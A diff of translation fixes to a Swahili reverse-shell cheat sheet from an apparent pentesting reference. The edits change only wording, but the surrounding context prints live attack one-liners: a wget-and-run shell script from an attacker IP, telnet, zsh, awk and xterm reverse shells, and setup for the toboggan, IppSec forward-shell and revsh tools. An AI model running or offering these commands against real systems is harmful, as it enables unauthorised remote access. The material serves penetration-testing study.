@@ -47,11 +47,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Wakati wa kushughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala ni kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
+Wakati wa kushughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala inahusisha kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
 
 Zana inayopendekezwa kwa kusudi hili ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo inarahisisha mwingiliano na mazingira ya lengo.
 
-Ili kutumia toboggan kwa ufanisi, tengeneza moduli ya Python iliyoundwa kwa muktadha wa RCE wa mfumo wako wa lengo. Kwa mfano, moduli inayoitwa `nix.py` inaweza kuandaliwa kama ifuatavyo:
+Ili kutumia toboggan kwa ufanisi, tengeneza moduli ya Python iliyoundwa kwa muktadha wa RCE wa mfumo wako wa lengo. Kwa mfano, moduli inayoitwa `nix.py` inaweza kuundwa kama ifuatavyo:
 ```python3
 import jwt
 import httpx
@@ -81,7 +81,7 @@ toboggan -m nix.py -i
 ```
 Ili kutumia moja kwa moja shell ya mwingiliano. Unaweza kuongeza `-b` kwa ajili ya uunganisho wa Burpsuite na kuondoa `-i` kwa wrapper ya rce ya msingi zaidi.
 
-Mwingine uwezekano ni kutumia utekelezaji wa shell ya mbele ya `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Uwezekano mwingine ni kutumia utekelezaji wa shell ya mbele wa `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Unahitaji tu kubadilisha:
 
@@ -89,7 +89,7 @@ Unahitaji tu kubadilisha:
 - Kichwa na kiambatisho cha payload yako (ikiwa ipo)
 - Njia ambayo payload inatumwa (headers? data? taarifa za ziada?)
 
-Kisha, unaweza tu **kutuma amri** au hata **kutumia amri ya `upgrade`** kupata PTY kamili (kumbuka kwamba mabomba yanapozungumziwa na kuandikwa kwa kuchelewesha takriban 1.3s).
+Kisha, unaweza tu **kutuma amri** au hata **kutumia amri ya `upgrade`** kupata PTY kamili (kumbuka kwamba mabomba yanapojengwa na kuandikwa kwa kuchelewesha takriban 1.3s).
 
 ## Netcat
 ```bash
@@ -118,7 +118,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Ili kutuma amri, andika chini, bonyeza enter na bonyeza CTRL+D (kuacha STDIN)
+Ili kutuma amri, iandike, bonyeza enter na bonyeza CTRL+D (kuacha STDIN)
 
 **Mtu aliyeathirika**
 ```bash
@@ -219,7 +219,7 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
-## Zsh (built-in TCP)
+## Zsh (imejumuishwa TCP)
 ```bash
 # Requires no external binaries; leverages zsh/net/tcp module
 zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
@@ -243,7 +243,7 @@ Features:
 
 ## revsh (encrypted & pivot-ready)
 
-`revsh` ni mteja/server mdogo wa C unaotoa TTY kamili kupitia **tunnel ya Diffie-Hellman iliyosimbwa** na inaweza kuambatanisha **TUN/TAP** interface kwa ajili ya pivoting kama VPN ya kurudi.
+`revsh` ni mteja/server mdogo wa C unaetoa TTY kamili kupitia **tunnel ya Diffie-Hellman iliyosimbwa** na inaweza kuambatanisha **TUN/TAP** interface kwa ajili ya pivoting kama VPN ya kurudi.
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -301,7 +301,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Ili kutuma amri, iandike, bonyeza enter na bonyeza CTRL+D (kuacha STDIN)
+Ili kutuma amri, andika chini, bonyeza enter na bonyeza CTRL+D (kuacha STDIN)
 
 **Mtu aliyeathirika**
 ```bash
@@ -338,7 +338,7 @@ Hii itajaribu kuungana na mfumo wako kwenye bandari 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Ili kukamata shell ya nyuma unaweza kutumia (ambayo itasikiliza kwenye bandari 6001):
+Ili kukamata reverse shell unaweza kutumia (ambayo itasikiliza kwenye bandari 6001):
 ```bash
 # Authorize host
 xhost +targetip
